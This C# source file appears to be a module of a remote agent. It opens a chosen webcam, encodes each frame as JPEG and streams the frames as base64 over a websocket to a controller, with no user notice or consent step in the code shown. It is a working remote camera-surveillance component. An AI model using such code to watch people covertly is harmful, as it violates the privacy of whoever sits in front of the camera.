using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using FlashCap;
using LibraNextgen.Agent.Communication;

namespace LibraNextgen.Agent.Modules.Execution;

public sealed class CameraCapture : IDisposable
{
    private readonly WsCommunicator _ws;
    private readonly string _agentId;

    private int _fps = 10;
    private int _cameraIndex;
    private const int JpegQuality = 60;

    private CancellationTokenSource? _cts;
    private CaptureDevice? _device;
    private static ImageCodecInfo? _jpegCodec;

    public static string GetDevicesJson()
    {
        try
        {
            var devices = new CaptureDevices();
            int i = 0;
            var list = devices.EnumerateDescriptors().Select(desc =>
            {
                var name = desc.Name;
                var idx = i++;
                var chars = desc.Characteristics.Select(c =>
                    $"{{\"w\":{c.Width},\"h\":{c.Height},\"fps\":{(double)c.FramesPerSecond.Numerator / Math.Max(1, c.FramesPerSecond.Denominator):F1},\"pixelFormat\":\"{c.PixelFormat}\"}}");
                return $"{{\"index\":{idx},\"name\":\"{EscapeJson(name)}\",\"characteristics\":[{string.Join(",", chars)}]}}";
            }).ToList();
            return $"[{string.Join(",", list)}]";
        }
        catch
        {
            return "[]";
        }
    }

    private static string EscapeJson(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

    public CameraCapture(WsCommunicator ws, string agentId)
    {
        _ws = ws;
        _agentId = agentId;
    }

    public void Start(int fps, int cameraIndex)
    {
        Stop();
        _fps = Math.Clamp(fps, 1, 30);
        _cameraIndex = cameraIndex;
        _cts = new CancellationTokenSource();
        _ = StartCaptureAsync(_cts.Token);
    }

    public void Stop()
    {
        _cts?.Cancel();
        if (_device != null)
        {
            try { _device.StopAsync().GetAwaiter().GetResult(); } catch { }
            _device.Dispose();
            _device = null;
        }
        _cts?.Dispose();
        _cts = null;
    }

    public void SetFps(int fps) => _fps = Math.Clamp(fps, 1, 30);

    public void Dispose() => Stop();

    private async Task StartCaptureAsync(CancellationToken ct)
    {
        try
        {
            var devices = new CaptureDevices();
            var descriptors = devices.EnumerateDescriptors().ToList();

            if (_cameraIndex >= descriptors.Count)
            {
                await _ws.SendResultAsync("camera.error", _agentId,
                    new { error = $"Camera index {_cameraIndex} not found. Available: {descriptors.Count}" });
                return;
            }

            var descriptor = descriptors[_cameraIndex];
            var characteristics = ChooseCharacteristics(descriptor, _fps);

            _device = await descriptor.OpenAsync(characteristics, OnFrameArrived);
            await _device.StartAsync(ct);
        }
        catch (Exception ex)
        {
            await _ws.SendResultAsync("camera.error", _agentId, new { error = ex.Message });
        }
    }

    private async void OnFrameArrived(PixelBufferScope bufferScope)
    {
        if (_cts?.IsCancellationRequested == true)
        {
            bufferScope.ReleaseNow();
            return;
        }

        try
        {
            var imageData = bufferScope.Buffer.ExtractImage();
            bufferScope.ReleaseNow();

            var jpeg = ToJpeg(imageData, JpegQuality);

            await _ws.SendResultAsync("camera.frame", _agentId, new
            {
                data = Convert.ToBase64String(jpeg)
            });
        }
        catch
        {
            bufferScope.ReleaseNow();
        }
    }

    private static VideoCharacteristics ChooseCharacteristics(
        CaptureDeviceDescriptor descriptor, int targetFps)
    {
        var all = descriptor.Characteristics.ToList();

        var jpegOnes = all
            .Where(c => c.PixelFormat == FlashCap.PixelFormats.JPEG)
            .OrderByDescending(c => c.Width * c.Height)
            .ToList();

        if (jpegOnes.Count > 0)
        {
            var match = jpegOnes.FirstOrDefault(c => c.FramesPerSecond.Numerator / Math.Max(1, c.FramesPerSecond.Denominator) >= targetFps);
            return match ?? jpegOnes[0];
        }

        return all
            .OrderByDescending(c => c.Width * c.Height)
            .First();
    }

    private static byte[] ToJpeg(byte[] imageData, int quality)
    {
        using var ms = new MemoryStream(imageData);
        using var bmp = new Bitmap(ms);
        using var output = new MemoryStream();

        var codec = GetJpegEncoder();
        var encParams = new EncoderParameters(1);
        encParams.Param[0] = new EncoderParameter(Encoder.Quality, (long)quality);
        bmp.Save(output, codec, encParams);
        return output.ToArray();
    }

    private static ImageCodecInfo GetJpegEncoder()
    {
        if (_jpegCodec != null) return _jpegCodec;
        foreach (var codec in ImageCodecInfo.GetImageEncoders())
        {
            if (codec.MimeType == "image/jpeg")
            {
                _jpegCodec = codec;
                return codec;
            }
        }
        throw new InvalidOperationException("JPEG encoder not found");
    }
}
